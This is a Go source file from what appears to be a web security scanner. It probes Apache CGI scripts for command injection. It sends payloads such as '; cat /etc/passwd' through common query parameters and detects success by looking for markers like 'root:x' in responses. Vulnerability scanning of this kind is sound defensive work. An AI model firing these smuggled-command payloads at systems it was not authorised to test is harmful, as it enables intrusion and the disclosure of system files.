package apache

import (
	"context"
	"strings"

	methodwebtest "github.com/Method-Security/methodwebtest/generated/go"
	utils "github.com/Method-Security/methodwebtest/utils/engines"
)

var commandInjectionPayloads = []string{
	"; cat /etc/passwd",
	"| cat /etc/hosts",
	"&& ls -la",
	"; echo 'RCE'",
	"| echo 'RCE'",
}

var commonModFilePaths = []string{
	"/test.cgi",
	"/admin.cgi",
	"/login.cgi",
	"/status.cgi",
	"/user.cgi",
	"/printenv.cgi",
	"/cgi-bin/test.cgi",
	"/cgi-bin/admin.cgi",
	"/cgi-bin/login.cgi",
	"/cgi-bin/status.cgi",
	"/cgi-bin/user.cgi",
	"/cgi-bin/printenv.cgi",
}

var queryParams = []string{
	"action",   // frequently seen in forms and CGI
	"mode",     // often used to toggle operations
	"cmd",      // used in some admin/debug tools
	"do",       // like ?do=login or ?do=edit
	"option",   // generic control flag
	"module",   // sometimes used in pluggable systems
	"plugin",   // same as module
	"function", // old PHP/Perl apps
	"query",    // search/query handler
	"search",   // common on older search pages
	"type",     // selects file or action type
	"lang",     // language, might be used for includes
	"file",     // filename input
}

func PerformApachePathModFileInjection(ctx context.Context, config *methodwebtest.PathModFileConfig) *methodwebtest.Report {
	generatedInjectionPayloads := generateModFileQueryInjectionParams(commandInjectionPayloads)

	injectionConfig := methodwebtest.InjectionEngineConfig{
		Targets:           config.Targets,
		Method:            methodwebtest.HttpMethodPost,
		Paths:             commonModFilePaths,
		InjectedPayloads:  generatedInjectionPayloads,
		InjectionLocation: methodwebtest.InjectionLocationQuery,
		EventType:         methodwebtest.NewEventTypeFromMultiEvent(methodwebtest.MultiEventCommandecho),
		FollowRedirects:   true,
		Timeout:           config.Timeout,
		Retries:           config.Retries,
		Sleep:             config.Sleep,
	}

	report := utils.RunMultiInjectionsEngine(ctx, &injectionConfig)
	detectModFileRCE(report)
	report.Config = methodwebtest.NewEngineConfigFromInjectionEngineConfig(&injectionConfig)
	return report
}

func generateModFileQueryInjectionParams(commandInjectionPayloads []string) []map[string]string {
	payloads := []map[string]string{}
	for _, queryParam := range queryParams {
		for _, payload := range commandInjectionPayloads {
			payloads = append(payloads, map[string]string{queryParam: payload})
		}
	}
	return payloads
}

func detectModFileRCE(report *methodwebtest.Report) {
	// Deterministic detection function
	indicators := []string{
		"root:x",    // Common content in /etc/passwd
		"127.0.0.1", // Common content in /etc/hosts
		"RCE",       // Custom echo
		"total",     // Common output of ls -la
	}
	for _, target := range report.Targets {
		if target.Attempts == nil {
			continue
		}
		for _, attempt := range target.Attempts {
			finding := false

			if attempt.Request != nil && attempt.Request.ResponseBody != nil {
				for _, indicator := range indicators {
					if strings.Contains(*attempt.Request.ResponseBody, indicator) {
						finding = true
					}
				}
			}
			attempt.Finding = &finding
		}
	}
}
